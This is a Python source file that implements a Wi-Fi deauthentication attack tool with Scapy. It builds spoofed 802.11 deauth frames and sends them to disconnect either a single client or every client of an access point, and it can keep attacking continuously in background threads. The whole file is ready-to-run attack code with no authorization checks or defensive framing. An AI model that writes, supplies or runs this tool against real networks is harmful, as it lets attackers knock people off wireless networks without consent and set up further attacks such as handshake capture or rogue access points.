#!/usr/bin/env python3
"""
Advanced Deauthentication Engine
Handles targeted and broadcast deauth attacks
"""

from scapy.all import *
import threading
import time
from colorama import Fore, Style
import logging

class DeauthEngine:
    def __init__(self, interface):
        self.interface = interface
        self.is_attacking = False
        self.threads = []
        self.targets = []
        self.logger = logging.getLogger('deauth_engine')
    
    def create_deauth_packet(self, target_mac, ap_mac, reason=7):
        """
        Create deauthentication packet
        reason codes: 
          1 - Unspecified
          7 - Class 3 frame received from nonassociated STA
          8 - Disassociated because sending STA is leaving BSS
        """
        # Target client -> AP
        packet1 = RadioTap() / Dot11(
            addr1=target_mac,  # Destination (client)
            addr2=ap_mac,      # Source (AP)
            addr3=ap_mac       # BSSID (AP)
        ) / Dot11Deauth(reason=reason)
        
        # AP -> Target client
        packet2 = RadioTap() / Dot11(
            addr1=ap_mac,      # Destination (AP)
            addr2=target_mac,  # Source (client)
            addr3=ap_mac       # BSSID (AP)
        ) / Dot11Deauth(reason=reason)
        
        return packet1, packet2
    
    def deauth_client(self, target_mac, ap_mac, count=10, interval=0.1):
        """Deauthenticate specific client from AP"""
        packet1, packet2 = self.create_deauth_packet(target_mac, ap_mac)
        
        for i in range(count):
            if not self.is_attacking:
                break
                
            try:
                sendp(packet1, iface=self.interface, verbose=0)
                sendp(packet2, iface=self.interface, verbose=0)
                self.logger.debug(f"Sent deauth packets to {target_mac}")
            except Exception as e:
                self.logger.error(f"Error sending deauth packet: {e}")
            
            time.sleep(interval)
    
    def broadcast_deauth(self, ap_mac, count=10, interval=0.1):
        """Broadcast deauthentication to all clients on AP"""
        # Create broadcast deauth packet
        packet = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
            addr2=ap_mac,               # Source (AP)
            addr3=ap_mac                # BSSID (AP)
        ) / Dot11Deauth(reason=7)
        
        for i in range(count):
            if not self.is_attacking:
                break
                
            try:
                sendp(packet, iface=self.interface, verbose=0)
                self.logger.debug(f"Sent broadcast deauth for {ap_mac}")
            except Exception as e:
                self.logger.error(f"Error sending broadcast deauth: {e}")
            
            time.sleep(interval)
    
    def start_deauth(self, ap_mac, target_mac=None, count=0, interval=0.1):
        """
        Start deauthentication attack
        count=0 for continuous attack
        """
        print(f"{Fore.CYAN}[*] Starting deauthentication attack{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] AP: {ap_mac}{Style.RESET_ALL}")
        
        if target_mac:
            print(f"{Fore.CYAN}[*] Target: {target_mac}{Style.RESET_ALL}")
            self.targets.append((ap_mac, target_mac))
        else:
            print(f"{Fore.CYAN}[*] Mode: Broadcast (all clients){Style.RESET_ALL}")
            self.targets.append((ap_mac, None))
        
        self.is_attacking = True
        
        # Start deauth thread
        if target_mac:
            thread = threading.Thread(
                target=self._continuous_deauth,
                args=(ap_mac, target_mac, count, interval)
            )
        else:
            thread = threading.Thread(
                target=self._continuous_broadcast_deauth,
                args=(ap_mac, count, interval)
            )
        
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        print(f"{Fore.GREEN}[+] Deauthentication attack started{Style.RESET_ALL}")
    
    def _continuous_deauth(self, ap_mac, target_mac, count, interval):
        """Continuous deauth for specific client"""
        if count == 0:
            # Continuous attack
            while self.is_attacking:
                self.deauth_client(target_mac, ap_mac, count=10, interval=interval)
                time.sleep(1)
        else:
            # Limited attack
            self.deauth_client(target_mac, ap_mac, count=count, interval=interval)
    
    def _continuous_broadcast_deauth(self, ap_mac, count, interval):
        """Continuous broadcast deauth"""
        if count == 0:
            # Continuous attack
            while self.is_attacking:
                self.broadcast_deauth(ap_mac, count=10, interval=interval)
                time.sleep(1)
        else:
            # Limited attack
            self.broadcast_deauth(ap_mac, count=count, interval=interval)
    
    def stop_deauth(self):
        """Stop all deauthentication attacks"""
        print(f"{Fore.CYAN}[*] Stopping deauthentication attacks{Style.RESET_ALL}")
        self.is_attacking = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
        
        self.threads.clear()
        self.targets.clear()
        print(f"{Fore.GREEN}[+] Deauthentication attacks stopped{Style.RESET_ALL}")
    
    def get_active_attacks(self):
        """Get list of active deauth attacks"""
        return self.targets.copy()
    
    def add_target(self, ap_mac, target_mac=None):
        """Add new target for deauthentication"""
        if (ap_mac, target_mac) not in self.targets:
            self.targets.append((ap_mac, target_mac))
            self.start_deauth(ap_mac, target_mac, count=0)
    
    def remove_target(self, ap_mac, target_mac=None):
        """Remove target from deauthentication"""
        if (ap_mac, target_mac) in self.targets:
            self.targets.remove((ap_mac, target_mac))
            # Note: Actual stopping happens in stop_deauth